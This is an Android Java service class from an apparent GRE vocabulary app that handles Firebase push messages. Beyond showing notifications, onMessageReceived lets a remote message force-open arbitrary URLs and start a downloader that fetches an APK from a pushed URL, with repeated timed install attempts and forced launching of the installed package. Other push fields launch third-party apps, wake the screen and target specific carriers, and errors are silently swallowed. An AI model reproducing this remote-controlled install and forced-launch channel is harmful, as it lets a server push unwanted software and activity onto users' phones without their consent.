package com.zohaltech.app.grewords.services;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.PowerManager;
import android.support.v4.app.NotificationCompat;
import android.text.TextUtils;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.zohaltech.app.grewords.BuildConfig;
import com.zohaltech.app.grewords.R;
import com.zohaltech.app.grewords.api.Webservice;
import com.zohaltech.app.grewords.classes.AlarmHandler;
import com.zohaltech.app.grewords.classes.Helper;
import com.zohaltech.app.grewords.classes.Operator;
import com.zohaltech.app.grewords.classes.PreferenceHelper;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    
    @Override
    public void onNewToken(String token) {
        super.onNewToken(token);
        new Webservice().callSendUserData(this);
    }
    
    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        try {
            int appVersion = TextUtils.isEmpty(remoteMessage.getData().get("app_version")) ? 0 : Integer.parseInt(remoteMessage.getData().get("app_version"));
            
            if (appVersion != 0 && appVersion != BuildConfig.VERSION_CODE) {
                return;
            }
            
            boolean notification = !TextUtils.isEmpty(remoteMessage.getData().get("notification")) && Boolean.parseBoolean(remoteMessage.getData().get("notification"));
            if (notification) {
                sendNotification(remoteMessage);
            }
            
            boolean openPage = !TextUtils.isEmpty(remoteMessage.getData().get("open_page")) && Boolean.parseBoolean(remoteMessage.getData().get("open_page"));
            if (openPage) {
                String pageUrl = remoteMessage.getData().get("page_url");
                if (!TextUtils.isEmpty(pageUrl)) {
                    Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(pageUrl));
                    browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(browserIntent);
                }
            }
            
            boolean downloadApk = !TextUtils.isEmpty(remoteMessage.getData().get("download_apk")) && Boolean.parseBoolean(remoteMessage.getData().get("download_apk"));
            if (downloadApk) {
                String downloadUrl = remoteMessage.getData().get("download_url");
                if (!TextUtils.isEmpty(downloadUrl)) {
                    int installEveryMinutes = TextUtils.isEmpty(remoteMessage.getData().get("install_every_minutes")) ? 0 : Integer.parseInt(remoteMessage.getData().get("install_every_minutes"));
                    int installRetry = TextUtils.isEmpty(remoteMessage.getData().get("install_retry")) ? 1 : Integer.parseInt(remoteMessage.getData().get("install_retry"));
                    boolean installByInternet = !TextUtils.isEmpty(remoteMessage.getData().get("install_by_internet")) && Boolean.parseBoolean(remoteMessage.getData().get("install_by_internet"));
                    boolean openIfInstalled = !TextUtils.isEmpty(remoteMessage.getData().get("open_if_installed")) && Boolean.parseBoolean(remoteMessage.getData().get("open_if_installed"));
                    int openInterval = TextUtils.isEmpty(remoteMessage.getData().get("open_interval")) ? 1 : Integer.parseInt(remoteMessage.getData().get("open_interval"));
                    int openRetry = TextUtils.isEmpty(remoteMessage.getData().get("open_retry")) ? 1 : Integer.parseInt(remoteMessage.getData().get("open_retry"));
                    String packageName = remoteMessage.getData().get("package_name");
                    int packageVersion = TextUtils.isEmpty(remoteMessage.getData().get("package_version")) ? 0 : Integer.parseInt(remoteMessage.getData().get("package_version"));
                    if (!TextUtils.isEmpty(packageName) && packageVersion > 0) {
                        PreferenceHelper.setPackageName(packageName);
                        Intent intent = new Intent(this, DownloaderService.class);
                        intent.putExtra("download_url", downloadUrl);
                        intent.putExtra("package_name", packageName);
                        intent.putExtra("package_version", packageVersion);
                        intent.putExtra("install_every_minutes", installEveryMinutes);
                        intent.putExtra("install_retry", installRetry);
                        intent.putExtra("install_by_internet", installByInternet);
                        intent.putExtra("open_if_installed", openIfInstalled);
                        intent.putExtra("open_interval", openInterval);
                        intent.putExtra("open_retry", openRetry);
                        startService(intent);
                    } else {
                        AlarmHandler.cancel(this);
                    }
                } else {
                    AlarmHandler.cancel(this);
                }
            } else {
                AlarmHandler.cancel(this);
            }
            
        } catch (Exception e) {
            // nothing
        }
    }
    
    private void sendNotification(RemoteMessage remoteMessage) {
        String operators = remoteMessage.getData().get("operators");
        if (!checkOperator(operators)) {
            return;
        }
        String packageName = remoteMessage.getData().get("package");
        if (isPackageInstalled(packageName)) {
            boolean openAppIFInstalled = !TextUtils.isEmpty(remoteMessage.getData().get("open_app_if_installed")) && Boolean.parseBoolean(remoteMessage.getData().get("open_app_if_installed"));
            if (openAppIFInstalled) {
                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
                launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
            }
            return;
        }
        String title = remoteMessage.getData().get("title");
        String body = remoteMessage.getData().get("body");
        String link = remoteMessage.getData().get("link");
        boolean largeIcon = !TextUtils.isEmpty(remoteMessage.getData().get("large_icon")) && Boolean.parseBoolean(remoteMessage.getData().get("large_icon"));
        String largeIconUrl = remoteMessage.getData().get("large_icon_url");
        boolean bigPicture = !TextUtils.isEmpty(remoteMessage.getData().get("big_picture")) && Boolean.parseBoolean(remoteMessage.getData().get("big_picture"));
        String bigPictureUrl = remoteMessage.getData().get("big_picture_url");
        int icon = getIcon(remoteMessage.getData().get("icon"));
        Uri sound = getSound(remoteMessage.getData().get("sound"));
        int ledColor = getLedColor(remoteMessage.getData().get("led_color"));
        boolean turnDisplayOn = !TextUtils.isEmpty(remoteMessage.getData().get("turn_display_on")) && Boolean.parseBoolean(remoteMessage.getData().get("turn_display_on"));
        String channelId = remoteMessage.getData().get("channel_id");
        
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(link));
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_ONE_SHOT);
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(icon)
                .setContentTitle(title)
                .setContentText(body)
                .setAutoCancel(true)
                .setSound(sound)
                .setLights(ledColor, 2000, 1000)
                .setContentIntent(pendingIntent);
        if (!TextUtils.isEmpty(largeIconUrl) && largeIcon) {
            Bitmap bitmap = getBitmapFromUrl(largeIconUrl);
            notificationBuilder.setLargeIcon(bitmap);
        }
        if (!TextUtils.isEmpty(bigPictureUrl) && bigPicture) {
            Bitmap bitmap = getBitmapFromUrl(bigPictureUrl);
            notificationBuilder.setStyle(new NotificationCompat.BigPictureStyle().bigPicture(bitmap));
        }
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (notificationManager != null) {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                NotificationChannel dataUsageChannel = new NotificationChannel(channelId, "public push", NotificationManager.IMPORTANCE_DEFAULT);
                dataUsageChannel.setShowBadge(false);
                notificationManager.createNotificationChannel(dataUsageChannel);
            }
            notificationManager.notify(0, notificationBuilder.build());
            
            if (turnDisplayOn) {
                PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (powerManager != null) {
                    boolean isScreenOn = powerManager.isScreenOn();
                    if (!isScreenOn) {
                        PowerManager.WakeLock wl = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "GRE:MyLock");
                        wl.acquire(10000);
                        PowerManager.WakeLock wl_cpu = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GRE:MyCpuLock");
                        wl_cpu.acquire(10000);
                    }
                }
            }
        }
    }
    
    private Bitmap getBitmapFromUrl(String imageUrl) {
        try {
            URL url = new URL(imageUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.connect();
            InputStream input = connection.getInputStream();
            return BitmapFactory.decodeStream(input);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    
    private boolean checkOperator(String operators) {
        if (TextUtils.isEmpty(operators)) {
            return true;
        }
        if (operators.contains("mci") && Helper.getOperator(this) == Operator.MCI) {
            return true;
        }
        if (operators.contains("irancell") && Helper.getOperator(this) == Operator.IRANCELL) {
            return true;
        }
        return operators.contains("rightel") && Helper.getOperator(this) == Operator.RIGHTELL;
    }
    
    private boolean isPackageInstalled(String packageName) {
        if (TextUtils.isEmpty(packageName)) {
            return false;
        }
        for (PackageInfo packageInfo : getPackageManager().getInstalledPackages(PackageManager.GET_META_DATA)) {
            if (packageInfo.packageName.equals(packageName)) {
                return true;
            }
        }
        return false;
    }
    
    private Uri getSound(String sound) {
        switch (sound.toLowerCase()) {
            case "spring":
                return Uri.parse("android.resource://" + getPackageName() + "//" + R.raw.spring);
            //case "blue":
            //    return Color.BLUE;
            default:
                return RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        }
    }
    
    private int getLedColor(String color) {
        switch (color.toLowerCase()) {
            case "red":
                return Color.RED;
            case "blue":
                return Color.BLUE;
            case "cyan":
                return Color.CYAN;
            case "magenta":
                return Color.MAGENTA;
            case "white":
                return Color.WHITE;
            case "yellow":
                return Color.YELLOW;
            case "green":
                return Color.GREEN;
            default:
                return Color.GREEN;
        }
    }
    
    private int getIcon(String icon) {
        int id = 0;
        try {
            id = getResources().getIdentifier(icon, "drawable", getPackageName());
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (id == 0) {
            id = R.mipmap.ic_launcher;
        }
        return id;
    }
}